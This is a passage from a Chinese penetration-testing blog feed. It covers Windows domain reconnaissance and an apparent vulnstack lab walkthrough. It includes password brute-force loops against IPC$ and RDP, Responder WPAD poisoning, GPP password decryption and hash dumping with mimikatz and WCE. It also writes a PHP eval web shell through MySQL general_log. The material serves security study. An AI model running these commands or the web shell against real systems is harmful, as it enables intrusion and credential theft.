alt="img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/5f86bde0-3bdb-4c2e-995e-dc1e80ffbbd0.png)" title>                </div>                <div class="image-caption">img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/5f86bde0-3bdb-4c2e-995e-dc1e80ffbbd0.png)</div>            </figure></p><p><a href="https://b404.xyz/img/hack/远程代码执行/post/5f86bde0-3bdb-4c2e-995e-dc1e80ffbbd0.png" target="_blank" rel="noopener">img</a></p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul><li>收集域以及域内用户信息</li><li>收集域内域控制器信息</li><li>收集域控上域用户登录日志信息</li><li>收集域内所有用户名以及全名、备注等信息</li><li>收集域内工作组信息</li><li>收集域管理员帐号信息</li><li>收集域内网段划分信息</li><li>收集域内组织单位信息</li></ul><h3 id="服务器-机器-定位"><a href="#服务器-机器-定位" class="headerlink" title="服务器(机器)定位"></a>服务器(机器)定位</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">不管是做外网还是内网，信息收集都是很有必要的第一步，当我们控下一台机器的时候，内网是个什么结构？这台机器是一个什么角色？使用机器的人是一个什么角色？上面装的什么杀毒？机器是怎么上网的？机器是笔记本，还是台式机？等等等等。。。ipconfig /all     //用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。net view         //用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.net view /domain//用来查看当前网络环境存在几个域.net view /domain:xxxx//查看xxx域中存在的跟本机有关联的机器.net group &quot;domain admins&quot; /domain//查看域内管理员.net user /domain//查看域内的用户名.net group &quot;domain computers&quot; /domain//查看域内所有机器名.net time /domain//查看域时间及域服务器的名字Nslookup -type=SRV _ldap._tcp.//查询DNSnetstat//查看连接信息.net group &quot;Domain Controllers&quot; /domain//查找域控nbtstat//由IP地址得到机器名</span><br></pre></td></tr></table></figure><p>copy</p><p>上面我们已经得到了一些内网信息,现在我们就需要好好分析一下了.</p><p>1、分析出内部网络是怎么划分的.是按照部门划分的网络段,还是按照楼层,还是按照地区划分.</p><p>2、分析出内部网络机器名的命名规则.特别是个人机,这对选取有价值目标很重要.不过有些内网是采用的无规则命名法,这也是正常的.但是一般还是有规律的.</p><p>3、分析出内部网络重要人的电脑名.这些重要人物一般在对外网站上都会有一些介绍的.再根据机器命名规则,就可以大概分析得出这些机器.这里要注意,有些人有多个电脑哦.还有些人用的是笔记本的.</p><p>4、分析域结构,有些内部网络是多层域结构,而且还是多级域结构,这样,我们就需要先分析出,现在这电脑所在域是几级子域,这个子域域控以及根域域控是哪些,还有其他域的域控是哪些.一般域控命名都有DC字样.</p><h3 id="文件定位"><a href="#文件定位" class="headerlink" title="文件定位"></a>文件定位</h3><p>服务器定位总结出文件定位的大致思路：</p><ul><li>定位人力资源主管个人机</li><li>定位人力资源相关文档存放位置</li><li>从人力资源文档中找相关人</li><li>定位相关人的机器</li><li>监视相关人工作时存放文档的位置</li><li>列出存放文档服务器的目录</li></ul><p>文件定位需要注意的点：</p><ul><li>产品名称</li><li>内部名称</li><li>项目负责人</li><li>项目团队</li><li>生产部（分公司，工厂，代工厂）</li></ul><p>经验：</p><ul><li>FTP</li><li>SMB</li><li>DC\NETLOGON\</li><li>产品管理系统（仓库管理系统）</li><li>各种数据库</li><li>其他服务器（分公司，工厂，代工厂）</li></ul><blockquote><p>定位文件服务器请参考上一节定位服务器（机器），定位到文件服务器和某个人，对于文件定位来说应该会事半功倍。这里就不过多叙述了。</p></blockquote><h3 id="管理员定位"><a href="#管理员定位" class="headerlink" title="管理员定位"></a>管理员定位</h3><p><strong>0x01工具：</strong></p><ul><li><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" target="_blank" rel="noopener">psloggedon.exe</a>:通过检验注册表里HKEY_USERS的key值来查询谁登陆过机器，同样也调用到了NetSessionEnum API。某些功能需要管理员权限</p></li><li><p><a href="http://www.joeware.net/freetools/index.htm" target="_blank" rel="noopener">netsess.exe</a>:调用NetSessionEnum API，并且在远程主机上无需管理员权限。</p></li><li><p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">PVEFindADUser.exe</a>:用于枚举域用户以及登陆过特定系统的用户，需要管理员权限</p></li><li><p><a href="https://github.com/mubix/netview" target="_blank" rel="noopener">netview.exe</a>:使用WinAPI枚举系统，利用NetSessionEnum来找寻登陆sessions,利用NetShareEnum来找寻共享 , 利用 NetWkstaUserEnum 来枚举登陆的用户。它也能查询共享入口和有价值用户，还能使用延迟和抖动。绝大部分功能不需要管理员权限。</p></li><li><p><a href="https://github.com/fdiskyou/hunter" target="_blank" rel="noopener">hunter</a>:hunter是一款利用 Windows API 调用来枚举跳板机上的用户登录信息的工具</p></li><li><p>Nmap的NSE脚本</p><p>：如果你有域账户或者本地账户，你可以使用Nmap的smb-enum-sessions.nse 引擎来获取远程机器的登录session，并且不需要管理员权限</p><ul><li><code>smb-enum-domains.nse</code>对域控制器进行信息收集扫描，可以获取主机信息，用户，密码策略可以用的用户等</li><li><code>smb-enum-users.nse</code>在进行域渗透的时候，有了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息的时候，可以借助这个脚本对域控制器进行扫描</li><li><code>smb-enum-shares.nse</code>遍历远程主机的共享目录</li><li><code>smb-enum-processes.nse</code>通过smb对主机的系统进程进行遍历，通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙以及杀毒软件。</li><li><code>smb-enum-sessions.nse</code>通过smb获取域内主机的用户登录session，查看当前是否有用户登录，对于我们抓取用户hash以及避免同时登陆被用户发现。</li><li><code>smb-os-discovery.nse</code>通过smb协议来收集目标主机的操作系统，计算机名，域名，全称域名，域林名称，NetBIOS机器名，NetBIOS域名，工作组，系统时间。</li></ul></li></ul><p><strong>0x02 Active Directory:</strong></p><p>通过AD信息来识别一些连接到服务器的用户：</p><ul><li><a href="http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/</a></li><li><a href="http://www.sixdub.net/2014/11/offensive-event-parsing-bringing-home-trophies/" target="_blank" rel="noopener">http://www.sixdub.net/2014/11/offensive-event-parsing-bringing-home-trophies/</a></li></ul><p><strong>0x03PowerShell：</strong></p><p>针对windows机器，可以考虑用wmi脚本和powershell脚本进行扫描，低频扫描可以很容易的绕过IDS的规则。PowerShell有很多方法Windows Api并且绕过白名单:</p><ul><li><a href="http://www.mottoin.com/89568.html" target="_blank" rel="noopener">http://www.mottoin.com/89568.html</a></li></ul><p><strong>0x04 查找域管理进程：</strong></p><ul><li><a href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/" target="_blank" rel="noopener">https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/</a></li></ul><hr><h2 id="进攻"><a href="#进攻" class="headerlink" title="进攻"></a>进攻</h2><p>1、内网WEB渗透.内网的WEB,一般情况下是比较容易搞下的,毕竟不像放在公共网络上.有那么大的风险,相对的,管理也就松散一些了.而且,内网的一些服务器是做测试用的,至于哪些服务器是做什么用的,可以通过判断机器名来分析,机器名的命名大多是有规律的.这跟国家风俗有一些习惯,但是也有公司采用无规则命令法,这就很蛋疼.</p><p>2、内网SQL.内网的SQL一般是特别有用的.因为一般域结构的内网,都会比较看重权限.那么一般WEB上都会有登陆验证,这些验证SQL就特别有用了，拿下来,对应人跟机器,后面,你懂的.</p><p>3、抓HASH，弱口令匹配内网机器。一般内网的机器弱口令还是存在的。分析一些内部的常用密码，然后再自己组合一些密码，再用工具去匹配，一般还是有收获的。以前有些HASH还破解不出来，还得依靠HASH注入这些技术，现在有了新东西mimikatz，可以抓取内存的密码，还是直接明文的。容易多了。</p><p>4、内网进攻常用命令整理：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\IP\ipc$ password /user:username@domain（IPC对方）net use \\ip\ipc$ &quot;pwd&quot;  /user:ip\username@domain （解决IPC时遇到权限问题）net time \\IPat  \\IP</span><br></pre></td></tr></table></figure><p>copy</p><h3 id="取得合法身份前的攻击"><a href="#取得合法身份前的攻击" class="headerlink" title="取得合法身份前的攻击"></a>取得合法身份前的攻击</h3><h4 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h4><p>攻击Windows常攻击Windows的文件和打印共享服务，这项服务运行在SMB(服务器消息块)上，尝试远程共享加载：试着连接一个共享卷(比如IPC$或C$共享卷)：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.200.21\IPC$ * \u:用户名</span><br></pre></td></tr></table></figure><p>copy</p><blockquote><p>*表示手动输入密码</p></blockquote><p>也可以使用FOR语句来爆破密码，将<code>tokent.txt</code>的第一个字串赋值给<code>%i</code>（密码），将第二个字串赋值给<code>%j</code>(用户名)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR /F &quot;tokens=1,2*&quot; %i in (token.txt) do net use \\192.168.200.21\IPC$ %i /u:%j</span><br></pre></td></tr></table></figure><p>copy</p><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b404.xyz/img/hack/内网/net_use_for.png" alt="img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/net_use_for.png)" title>                </div>                <div class="image-caption">img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/net_use_for.png)</div>            </figure></p><p><a href="https://b404.xyz/img/hack/内网/net_use_for.png" target="_blank" rel="noopener">img</a></p><p>也可以使用以下工具进行口令猜测：</p><ul><li><a href="https://packetstormsecurity.com/files/download/31882/enum.tar.gz" target="_blank" rel="noopener">enum</a></li><li><a href="http://www.hoobie.net/brutus/index.html" target="_blank" rel="noopener">Brutus</a></li><li><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">THC Hydra</a></li><li><a href="http://foofus.net/?page-id=51" target="_blank" rel="noopener">Medusa</a></li></ul><p>用enum爆破：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\win2k8\Desktop&gt;enum.exe -D -u Administrator -f credentials.txt 192.168.200.21</span><br></pre></td></tr></table></figure><p>copy</p><p>有时候也可以直接爆破远程桌面服务。</p><p>用<a href="http://www.hammerofgod.com/resources/downloads/tsgrinder-2.03.zip" target="_blank" rel="noopener">TSGrinder</a>爆破RDP：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\win2k8\Desktop\tsgrinder-2.03&gt;echo Admin 1&gt;a  &amp; tsgrinder.exe -w a -u Administrator -n 1 192.168.200.21 1&gt;out</span><br></pre></td></tr></table></figure><p>copy</p><blockquote><p>该工具主要针对于XP和2003，当用在win7的时候，需要将注册表<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting\Dont Show UI</code>设为1.</p></blockquote><p>kali下的rdesktop爆破：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop -u Administrator -p token.txt 10.10.10.150</span><br></pre></td></tr></table></figure><p>copy</p><h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p><strong>0x01 nbtscan:</strong> 使用<a href="http://www.unixwiz.net/tools/nbtscan.html" target="_blank" rel="noopener">nbtscan</a>扫描：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbtstat -m 192.168.200.21nbtscan 192.168.200.0/24</span><br></pre></td></tr></table></figure><p>copy</p><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b404.xyz/img/hack/内网/nbtscan.png" alt="img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/nbtscan.png)" title>                </div>                <div class="image-caption">img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/nbtscan.png)</div>            </figure></p><p><a href="https://b404.xyz/img/hack/内网/nbtscan.png" target="_blank" rel="noopener">img</a></p><blockquote><p>SHARING 表示开放来共享， DC 表示可能是域控，或者是辅助域控U=user猜测此计算机登陆名 IIS 表示运行来web80 EXCHANGE Microsoft Exchange服务 NOTES Lotus Notes服务</p></blockquote><p><strong>0x02:WinScanX:</strong></p><p>WinScanX 需要登录账号能够获取目标很详细的内容。其中还有snmp获取,windows密码猜解(但是容易被杀,nishang中也实现出一个类似的信息获取/Gather/Get-Information.ps1)</p><h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击技巧</th></tr></thead><tbody><tr><td align="left">21/22/69</td><td align="left">ftp / tftp：文件传输协议</td><td align="left">爆破\嗅探\溢出\后门</td></tr><tr><td align="left">22</td><td align="left">ssh：远程连接</td><td align="left">爆破OpenSSH; 28个退格</td></tr><tr><td align="left">23</td><td align="left">telnet：远程连接</td><td align="left">爆破\嗅探</td></tr><tr><td align="left">25</td><td align="left">smtp：邮件服务</td><td align="left">邮件伪造</td></tr><tr><td align="left">53</td><td align="left">DNS：域名解析系统</td><td align="left">DNS域名传输\ DNS劫持\ DNS缓存投毒\ DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td align="left">67/68</td><td align="left">dhcp</td><td align="left">劫持\欺骗</td></tr><tr><td align="left">110</td><td align="left">pop3</td><td align="left">爆破</td></tr><tr><td align="left">139</td><td align="left">samba</td><td align="left">爆破\未授权访问\远程代码执行</td></tr><tr><td align="left">143</td><td align="left">imap</td><td align="left">爆破</td></tr><tr><td align="left">161</td><td align="left">snmp</td><td align="left">爆破</td></tr><tr><td align="left">389</td><td align="left">ldap</td><td align="left">注入攻击\未授权访问</td></tr><tr><td align="left">512/513/514</td><td align="left">linux r</td><td align="left">直接使用rlogin</td></tr><tr><td align="left">873</td><td align="left">rsync</td><td align="left">未授权访问</td></tr><tr><td align="left">1080</td><td align="left">socket</td><td align="left">爆破：进行内网渗透</td></tr><tr><td align="left">1352</td><td align="left">lotus</td><td align="left">爆破：弱口令\信息泄漏：源代码</td></tr><tr><td align="left">1433</td><td align="left">mssql</td><td align="left">爆破：使用系统用户登录\注入攻击</td></tr><tr><td align="left">1521</td><td align="left">oracle</td><td align="left">爆破：TNS \注入攻击</td></tr><tr><td align="left">2049</td><td align="left">nfs</td><td align="left">配置不当</td></tr><tr><td align="left">2181</td><td align="left">zookeeper</td><td align="left">未授权访问</td></tr><tr><td align="left">3306</td><td align="left">mysql</td><td align="left">爆破\拒绝服务\注入</td></tr><tr><td align="left">3389</td><td align="left">rdp</td><td align="left">爆破\ Shift后门</td></tr><tr><td align="left">4848</td><td align="left">glassfish</td><td align="left">爆破：控制台弱口令\认证绕过</td></tr><tr><td align="left">5000</td><td align="left">sybase / DB2</td><td align="left">爆破\注入</td></tr><tr><td align="left">5432</td><td align="left">postgresql</td><td align="left">缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td align="left">5632</td><td align="left">pcanywhere</td><td align="left">拒绝服务\代码执行</td></tr><tr><td align="left">5900</td><td align="left">vnc</td><td align="left">爆破：弱口令\认证绕过</td></tr><tr><td align="left">6379</td><td align="left">redis</td><td align="left">未授权访问\爆破：弱口令</td></tr><tr><td align="left">7001</td><td align="left">weblogic</td><td align="left">Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td align="left">80/443/8080</td><td align="left">web</td><td align="left">常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td align="left">8069</td><td align="left">zabbix</td><td align="left">远程命令执行</td></tr><tr><td align="left">9090</td><td align="left">websphere控制台</td><td align="left">爆破：控制台弱口令\ Java反序列</td></tr><tr><td align="left">9200/9300</td><td align="left">elasticsearch</td><td align="left">远程代码执行</td></tr><tr><td align="left">11211</td><td align="left">memcacache</td><td align="left">未授权访问</td></tr><tr><td align="left">27017</td><td align="left">mongodb</td><td align="left">爆破\未授权访问</td></tr></tbody></table><h3 id="凭据"><a href="#凭据" class="headerlink" title="凭据"></a>凭据</h3><p>没有登录凭据的时候，可以破解对方的WPAv2个人Wifi密码，或者从某台不受域管理的主机下手。</p><h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><p><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a>可以在一无所知的情况下取得最初的登陆凭据，其能率先监听、响应LLMNR协议(本地链路多播名称解析协议)和NBT-NS协议，其也可以利用<a href="https://blogs.technet.microsoft.com/srd/2012/11/13/ms12-074-addressing-a-vulnerability-in-wpads-pac-file-handling/" target="_blank" rel="noopener">WPAD（Web Proxy Auto-Discovery）漏洞</a>（也就是浏览器设置为自动检测的设置，受害者会从网络获取配置文件）</p><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b404.xyz/img/hack/内网/IE_Auto_detect_settings.png" alt="img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/IE_Auto_detect_settings.png)" title>                </div>                <div class="image-caption">img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/IE_Auto_detect_settings.png)</div>            </figure></p><p><a href="https://b404.xyz/img/hack/内网/IE_Auto_detect_settings.png" target="_blank" rel="noopener">img</a></p><p>该情况，与受害人主机处于同一个网络里的攻击人员，能够回复受害主机发出的名称解析请求，并注入自己的PAC文件，代理所有WEB流量。这种攻击方式能强制浏览器用户对攻击人员的SMB服务器进行验证。若受害者在我们的SMB服务器上进行身份验证，就能够获取这个主机的NTLM算法的哈希响应值，而受害者没有任何察觉，若该用户进行过域验证，那么它就会使用缓存中的登陆凭据对服务器进行验证。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python Responder.py -i 10.10.10.149 -I eth0 -b Off -r Off -w On</span><br></pre></td></tr></table></figure><p>copy</p><blockquote><p>收到WPAD请求的时候发送恶意响应。</p></blockquote><h4 id="组策略首选项"><a href="#组策略首选项" class="headerlink" title="组策略首选项"></a>组策略首选项</h4><p>GPP的全名是组策略首选项，是为了满足管理活动目录的需要存在的，GPP的操作对象是组策略对象（GPO），在所有计算机上更新密码或者指定新的管理员，就会使用这个机制更新。GPP发布的账号信息全部存储在<code>\\[Domain Controller]\SYSVOL\[Ddomain]\Policies</code>中。可以在该文件夹找到一个名为<code>Groups.xml</code>的文件。若能找到该文件，就可以在<code>Groups.xml</code>文件找到<code>cpassword</code>的哈希值。然后使用<a href="https://pastebin.com/TE3fvhEh" target="_blank" rel="noopener">gpprefdecrypt.py</a>解密GPP中本地管理员账户的密码，或者使用msf中的<code>post/windows/gather/credentials/gpp</code>获取本地管理员账号。</p><h4 id="抓HASH"><a href="#抓HASH" class="headerlink" title="抓HASH"></a>抓HASH</h4><h5 id="Get-PassHashes-ps1"><a href="#Get-PassHashes-ps1" class="headerlink" title="Get-PassHashes.ps1"></a>Get-PassHashes.ps1</h5><p>脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Tim\Desktop\nishang-master&gt; Set-ExecutionPolicy remotesignedPS C:\Users\Tim\Desktop\nishang-master&gt; Import-Module .\nishang.psm1PS C:\Users\Tim\Desktop\nishang-master&gt; Get-PassHashes</span><br></pre></td></tr></table></figure><p>copy</p><h5 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h5><p><a href="http://www.ampliasecurity.com/research/windows-credentials-editor/" target="_blank" rel="noopener">WCE</a>能够列出Windows中的登陆会话、增加、修改、查询和删除相关凭据(LM/NT哈希值,Kerberos票据，明文密码)。</p><p><code>wce -l</code>列出已登陆的会话和NTLM凭据，<code>wce -w</code>用于复制存储在认证摘要信息中的明文密码。只要有管理员权限就可以抓取密码，无需破解hash值。</p><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b404.xyz/img/tools/domain/hash/wce.png" alt="img](https://b404.xyz/img/tools/domain/hash/wce.png)" title>                </div>                <div class="image-caption">img](https://b404.xyz/img/tools/domain/hash/wce.png)</div>            </figure></p><p><a href="https://b404.xyz/img/tools/domain/hash/wce.png" target="_blank" rel="noopener">img</a></p><h5 id="Minikatz"><a href="#Minikatz" class="headerlink" title="Minikatz"></a>Minikatz</h5><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz</a>可从LSASS中恢复明文密码。</p><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b404.xyz/img/tools/domain/hash/mimikatz.png" alt="img](https://b404.xyz/img/tools/domain/hash/mimikatz.png)" title>                </div>                <div class="image-caption">img](https://b404.xyz/img/tools/domain/hash/mimikatz.png)</div>            </figure></p><p><a href="https://b404.xyz/img/tools/domain/hash/mimikatz.png" target="_blank" rel="noopener">img</a></p><hr><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><ul><li><a href="http://www.mottoin.com/92978.html" target="_blank" rel="noopener">内网渗透测试定位技术总结</a>:<a href="http://www.mottoin.com/92978.html" target="_blank" rel="noopener">http://www.mottoin.com/92978.html</a></li><li><a href="http://www.mottoin.com/85401.html" target="_blank" rel="noopener">nmap加载nse脚本在内网渗透中的使用－上</a>:<a href="http://www.mottoin.com/85401.html" target="_blank" rel="noopener">http://www.mottoin.com/85401.html</a></li><li><a href="http://www.mottoin.com/85413.html" target="_blank" rel="noopener">nmap加载nse脚本在内网渗透中的使用－下</a>:<a href="http://www.mottoin.com/85413.html" target="_blank" rel="noopener">http://www.mottoin.com/85413.html</a></li><li><a href="https://raw.githubusercontent.com/l3m0n/pentest_study/master/README.md" target="_blank" rel="noopener">pentest_study</a>:<a href="https://raw.githubusercontent.com/l3m0n/pentest_study/master/README.md" target="_blank" rel="noopener">https://raw.githubusercontent.com/l3m0n/pentest_study/master/README.md</a></li></ul><hr><h2 id="Similar-Posts"><a href="#Similar-Posts" class="headerlink" title="Similar Posts"></a>Similar Posts</h2><ul><li><a href="https://b404.xyz/2019/02/24/reverse-shell-with-openssl/" target="_blank" rel="noopener">使用openssl反弹shell</a></li><li><a href="https://b404.xyz/2019/01/03/curl-commands/" target="_blank" rel="noopener">curl命令</a></li><li><a href="https://b404.xyz/2018/01/27/hidden-the-network/" target="_blank" rel="noopener">阻碍获取真实网络指纹</a></li><li><a href="https://b404.xyz/2018/01/04/command-and-control-images/" target="_blank" rel="noopener">command-and-control-images</a></li></ul><p>转自： <a href="http://b404.xyz/2017/12/30/exploit-domain/#内网和域" target="_blank" rel="noopener">http://b404.xyz/2017/12/30/exploit-domain/#%E5%86%85%E7%BD%91%E5%92%8C%E5%9F%9F</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网和域&quot;&gt;&lt;a href=&quot;#内网和域&quot; class=&quot;headerlink&quot; title=&quot;内网和域&quot;&gt;&lt;/a&gt;内网和域&lt;/h1&gt;&lt;h2 id=&quot;内网&quot;&gt;&lt;a href=&quot;#内网&quot; class=&quot;headerlink&quot; title=&quot;内网&quot;&gt;&lt;/a&gt;内网&lt;/h
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://13l00m.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="https://13l00m.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="域渗透" scheme="https://13l00m.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【红日sec】内网渗透靶场</title>
    <link href="https://13l00m.github.io/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/"/>
    <id>https://13l00m.github.io/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/</id>
    <published>2020-03-09T12:40:15.000Z</published>
    <updated>2020-03-09T12:44:24.665Z</updated>
    
    <content type="html"><![CDATA[<h3 id="靶场下载地址：http-vulnstack-qiyuanxuetang-net-vuln-detail-2"><a href="#靶场下载地址：http-vulnstack-qiyuanxuetang-net-vuln-detail-2" class="headerlink" title="靶场下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/"></a>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></h3><h3 id="开始之前先说一下实验环境："><a href="#开始之前先说一下实验环境：" class="headerlink" title="开始之前先说一下实验环境："></a>开始之前先说一下实验环境：</h3><ul><li><h3 id="Kali（192-168-70-128）和-Win7（192-168-70-129）都在192-168-70段"><a href="#Kali（192-168-70-128）和-Win7（192-168-70-129）都在192-168-70段" class="headerlink" title="Kali（192.168.70.128）和 Win7（192.168.70.129）都在192.168.70段"></a>Kali（192.168.70.128）和 Win7（192.168.70.129）都在192.168.70段</h3></li><li><h3 id="模拟内网的2K3和Win2008都在192-168-140段"><a href="#模拟内网的2K3和Win2008都在192-168-140段" class="headerlink" title="模拟内网的2K3和Win2008都在192.168.140段"></a>模拟内网的2K3和Win2008都在192.168.140段</h3></li><li><h3 id="开始实验之前不要忘记开启Win7里面的phpStudy"><a href="#开始实验之前不要忘记开启Win7里面的phpStudy" class="headerlink" title="开始实验之前不要忘记开启Win7里面的phpStudy"></a>开始实验之前不要忘记开启Win7里面的phpStudy</h3></li></ul><h2 id="开始实验："><a href="#开始实验：" class="headerlink" title="开始实验："></a>开始实验：</h2><hr><h3 id="访问Web"><a href="#访问Web" class="headerlink" title="访问Web"></a>访问Web</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309171619751.png" alt="image-20200309171619751" title>                </div>                <div class="image-caption">image-20200309171619751</div>            </figure><p>出现这个界面有两个思路：</p><ul><li>19年phpStudy的RCE（本文未利用）</li><li>phpmyadmin写shell</li></ul><p>但是不着急，这个靶场做出来肯定还有其他地方可利用</p><p>通过扫描目录，发现了网站的备份文件和cms站点</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309172128569.png" alt="image-20200309172128569" title>                </div>                <div class="image-caption">image-20200309172128569</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309172203571.png" alt="image-20200309172203571" title>                </div>                <div class="image-caption">image-20200309172203571</div>            </figure><p>查看下载的备份文件，发现了管理员账号密码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309172759886.png" alt="image-20200309172759886" title>                </div>                <div class="image-caption">image-20200309172759886</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309172808314.png" alt="image-20200309172808314" title>                </div>                <div class="image-caption">image-20200309172808314</div>            </figure><p>尝试登录看看 ，用网上说的弱口令也是错的（难道我这靶场被人动了手脚？？？）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309172902009.png" alt="image-20200309172902009" title>                </div>                <div class="image-caption">image-20200309172902009</div>            </figure><p>返回phpmyadmin，弱口令登录</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309173156872.png" alt="image-20200309173156872" title>                </div>                <div class="image-caption">image-20200309173156872</div>            </figure><p>这里可以利用mysql的错误日志写shell</p><p>具体代码(之前的文章中有讲到)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &apos;%general%&apos;; #查看配置</span><br><span class="line">set global general_log = on; #开启general log 模式</span><br><span class="line">set global general_log_file = &apos;path&apos;; #设置日志目录为shell地址</span><br><span class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; 写入shell</span><br></pre></td></tr></table></figure><p>这里关于上面的代码要说一点，如果能写入但文件不存在(404)，可能是在设置shell的地址的时候存在被转义的情况</p><p>利用这个地方上传了一个msf生成的php马，但是功能有点少，执行命令也出现了问题，所以后续又上传了exe马和php大马(执行exe文件)</p><p>接收到信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img 